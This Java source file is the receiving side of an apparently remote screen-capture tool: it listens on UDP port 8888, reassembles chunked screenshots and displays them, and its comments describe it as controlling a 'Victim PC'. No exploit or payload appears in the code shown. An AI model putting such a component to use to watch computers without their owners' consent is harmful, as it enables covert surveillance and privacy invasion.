package servicelayer;

import java.net.*;
import java.io.*;
import java.awt.*;
import java.awt.image.*;
import java.math.*;
import javax.imageio.*;
import javax.swing.*;
import java.awt.event.*;
import userinterface.*;
import net.coobird.thumbnailator.Thumbnails;


/**
    This class is the receiver which receives the Screen Shot and controls the Victim PC.
    @author: Rohit Methwani
*/

public class DReceiver{

    //Data Members
    private DatagramSocket socket;
    private DatagramPacket packet;
    private byte[] screenImage;
    private byte[] length;
    private String maxLength="";
    private byte[] dataInUnitPacket;
    private byte[] packetLength;
    private Integer maxData;
    private byte[] fullLength;
    private int byteCounter;
    private DatagramPacket unitPacket;
    private Timer time;
    private int z=0;
    private FileOutputStream fos;
    private BufferedImage thumbnail;
    private InputStream in;
    private String[] buffArray;
    private BufferedImage bImageFromConvert;
    private MainFrame frame = new MainFrame();
    private Thread receiving = new Thread(){
        public void run(){
            try{
                while(true){
                    receiveImage();
                }
            }
            catch(Exception ioe){
                System.out.println("Excpetion form thread:"+ioe);
            }
        }
    };

    /**
        Constructor:
        Initializes the DatagramSocket with the same port as of TCP Socket of the same client
       */
    public DReceiver(){
        try{
            socket = new DatagramSocket(8888);
            receiving.start();
        }
        catch(Exception ioe){
            System.out.println(ioe);
        }
    }

    /**
        This method receives the Screen Shot sent by the sender.
        @param: Nothing.
        @param: Nothing.
    */

    
public void receiveImage(){
        try{
            System.out.println("Receiving image");
            packetLength = new byte[20];
            packet = new DatagramPacket(packetLength,packetLength.length);
            socket.receive(packet);
            maxLength = new String(packetLength,0,packet.getLength());
            System.out.println("String maxLength:"+maxLength);
            if(maxLength.contains("Count")){
                buffArray = maxLength.split(" ");
                // System.out.println(buffArray[0]);
                // System.out.println(buffArray[1]);
                maxData = new Integer(buffArray[1]);
                fullLength = new byte[maxData];
                byteCounter = 0;
                for (int i = 0; i <= (maxData/1024); i++) {
                    // System.out.println("I:"+i);
                    dataInUnitPacket = new byte[1024];
                    unitPacket = new DatagramPacket(dataInUnitPacket, dataInUnitPacket.length);
                    socket.receive(unitPacket);
                    for (byte b : dataInUnitPacket) {
                        fullLength[byteCounter++] = b;
                        if (byteCounter == maxData) {   
                            break;
                        }
                    }
                }
                System.out.println("All data received");
                screenImage = fullLength;
                in = new ByteArrayInputStream(fullLength);
                bImageFromConvert = ImageIO.read(in);
                thumbnail = Thumbnails.of(bImageFromConvert).size(1280,720).asBufferedImage();
                frame.setPanel(toBytes(thumbnail));
            }
            else{
                System.out.println("Excpetion hai kuch toh!");
            }
        }
        catch(Exception ioe){
            System.out.println("Exception:"+ioe);
        }
    }

    /**
        This method converts the given BufferedImage into byte array using ByteArrayOutputStream.
        @param: BufferedImage which has to be converted.
        @return: Byte array of the given BufferedImage
    */
    private byte[] toBytes(BufferedImage image){
        try{
            ByteArrayOutputStream out = new ByteArrayOutputStream();
            ImageIO.write(image,"jpeg", out);
            byte[] imageBytes = out.toByteArray();
            return imageBytes;
        }
        catch(Exception ioe){
            System.out.println(ioe);
            return null;
        }
    }



    /**
        This method returns the received image bytes.This is used for linking of User Interface.
        @param: Nothing.
        @return: Byte array of the received image.
    */

    public byte[] sendImage(){
        return fullLength;
    }

    /**
        UNIT TESTING.
    */
    public static void main(String[] args) {
        DReceiver se = new DReceiver();
        // se.receiveImage();
        System.out.println("Object created");
    }

}